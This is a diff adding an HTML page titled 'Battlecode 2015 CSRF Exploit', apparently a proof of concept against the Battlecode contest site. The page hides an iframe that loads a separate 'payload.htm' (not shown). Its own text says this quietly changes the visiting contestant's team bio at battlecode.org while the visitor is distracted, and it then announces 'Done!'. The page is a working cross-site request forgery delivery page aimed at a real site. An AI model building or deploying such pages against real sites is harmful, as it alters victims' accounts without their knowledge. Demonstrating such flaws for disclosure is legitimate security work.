@@ -1,0 +1,22 @@
+<!DOCTYPE>
+<html>
+    <head>
+        <title>Battlecode 2015 CSRF Exploit</title>
+        <link href="//cdnjs.cloudflare.com/ajax/libs/normalize/3.0.3/normalize.min.css" rel="stylesheet"/>
+        <link href="//cdnjs.cloudflare.com/ajax/libs/skeleton/2.0.4/skeleton.min.css" rel="stylesheet"/>
+        <style>
+            iframe {
+                display: none;
+            }
+        </style>
+    </head>
+    <body class="container">
+        <br/>
+        <h1>Battlecode 2015 CSRF Exploit</h1>
+        <p>
+            Give it a few seconds... pretend this page has lots of distracting pictures of cats while we subtly 
+            change your bio at http://www.battlecode.org/contestants/team-options/.
+        </p>
+        <iframe onload="alert('Done! Your team\'s bio field has *probably* been changed.')" src="payload.htm"></iframe>
+    </body>
+</html>
